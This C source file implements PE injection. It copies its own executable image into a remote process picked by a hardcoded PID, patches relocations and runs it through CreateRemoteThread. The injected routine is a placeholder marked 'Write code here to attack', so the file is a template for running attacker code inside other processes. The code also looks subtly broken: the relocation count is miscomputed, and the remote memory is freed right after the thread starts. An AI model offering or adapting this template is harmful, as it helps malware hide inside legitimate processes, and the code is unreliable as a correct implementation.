/*
* Title: PE Injection
* Resources:
*	- https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes#code
* Status: In my experience, it does not work on Windows 11. The error does not occur but InjectEntryPoint does not work.
*/
#include <Windows.h>
#include <stdio.h>

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

VOID Cleanup(PVOID pLocalImage, HANDLE hProcess, PVOID pTargetImage) {
	if (pLocalImage)
		VirtualFree(pLocalImage, 0, MEM_RELEASE);
	if (pTargetImage)
		VirtualFreeEx(hProcess, pTargetImage, 0, MEM_RELEASE);
	if (hProcess)
		CloseHandle(hProcess);
}

DWORD InjectionEntryPoint() {
	/*
	* Write code here to attack...
	*/

	// This is just an example code.
	MessageBoxA(NULL, "PE Injection", "The target process has been injected successfully.", MB_OK);

	return 0;
}

BOOL PeInjection() {
	DWORD dwPid = 7256; // Change it with the target PID.

	PVOID pImageBase = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pImageBase;
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)pImageBase + pDosHeader->e_lfanew);

	// Overwrite an allocated memory with the image base.
	PVOID pLocalImage = VirtualAlloc(nullptr, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
	if (!pLocalImage) {
		Cleanup(pLocalImage, nullptr, nullptr);
		return FALSE;
	}
	memcpy(pLocalImage, pImageBase, pNtHeaders->OptionalHeader.SizeOfImage);

	HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, dwPid);
	if (!hProcess) {
		Cleanup(pLocalImage, hProcess, nullptr);
		return FALSE;
	}

	PVOID pTargetImage = VirtualAllocEx(hProcess, nullptr, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pTargetImage) {
		Cleanup(pLocalImage, hProcess, pTargetImage);
		return FALSE;
	}

	// Calculate delta between addresses of where the image will be located in the target process and where it's located currently.
	DWORD_PTR deltaImageBase = (DWORD_PTR)pTargetImage - (DWORD_PTR)pImageBase;

	// Relocate pLocalImage, to ensure that it will have correct addresses once its in the target process
	PIMAGE_BASE_RELOCATION pRelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pLocalImage + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	DWORD dwRelocEntriesCount = 0;
	PDWORD_PTR patchedAddr = nullptr;
	PBASE_RELOCATION_ENTRY pRelocRVA = nullptr;

	while (pRelocTable->SizeOfBlock > 0) {
		dwRelocEntriesCount = (pRelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION) / sizeof(USHORT));
		pRelocRVA = (PBASE_RELOCATION_ENTRY)(pRelocTable + 1);

		for (short i = 0; i < dwRelocEntriesCount; i++) {
			if (pRelocRVA[i].Offset) {
				patchedAddr = (PDWORD_PTR)((DWORD_PTR)pLocalImage + pRelocTable->VirtualAddress + pRelocRVA[i].Offset);
				*patchedAddr += deltaImageBase;
			}
		}
		pRelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)pRelocTable + pRelocTable->SizeOfBlock);
	}
	
	if (!WriteProcessMemory(hProcess, pTargetImage, pLocalImage, pNtHeaders->OptionalHeader.SizeOfImage, nullptr)) {
		Cleanup(pLocalImage, hProcess, pTargetImage);
		return FALSE;
	}

	CreateRemoteThread(
		hProcess,
		nullptr,
		0,
		(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + deltaImageBase),
		nullptr,
		0,
		nullptr
	);

	Cleanup(pLocalImage, hProcess, pTargetImage);

	return TRUE;
}
